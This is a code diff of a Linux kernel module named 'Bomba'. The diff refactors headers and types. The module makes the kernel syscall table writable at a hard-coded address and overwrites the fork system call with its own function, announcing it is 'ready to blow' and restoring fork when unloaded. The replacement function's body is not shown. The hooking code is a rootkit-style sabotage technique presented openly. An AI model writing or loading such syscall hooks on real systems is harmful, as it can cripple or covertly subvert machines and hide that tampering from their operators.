@@ -1,25 +1,13 @@
-#include <linux/module.h> 
-#include <linux/kernel.h> 
-#include <asm/unistd.h> 
-#include <asm/fcntl.h> 
-#include <asm/errno.h> 
-#include <linux/types.h> 
-#include <linux/dirent.h> 
-#include <linux/string.h> 
-#include <linux/fs.h> 
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/slab.h>
-#include <linux/highmem.h>
-#include <asm/unistd.h>
+#include "include.h"
 #include "rw.h"
-MODULE_LICENSE("GPL");
 #include "syscall.h"
+#include "utility.h"
+MODULE_LICENSE("GPL");
 
 #define fork_code 40
 
-int (*orig_syscall)(void); /*the original systemcall*/ 
 const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;
+SYS_mkdir_type orig_syscall; /*the original systemcall*/ 
 
 // This kills the crab.
 int replace_syscall(void) {
@@ -33,13 +21,14 @@ int replace_syscall(void) {
 int init_module() {
 	printk("Bomba initializing...\n");
 	make_rw(sys_call_table);
-	orig_syscall = sys_call_table[fork_code];
-	sys_call_table[fork_code] = replace_syscall;
+	orig_syscall = (SYS_mkdir_type) sys_call_table[SYS_fork];
+	sys_call_table[SYS_fork] = (syscall) replace_syscall;
 	printk("Bomba ready to blow...\n");
 	return 0;
 }
 
 void cleanup_module() {
-	sys_call_table[fork_code] = orig_syscall;
+	sys_call_table[SYS_fork] = (syscall) orig_syscall;
 	printk(KERN_INFO "Bomba defused\n");
+	printk(KERN_INFO "Module Removed\n");
 }
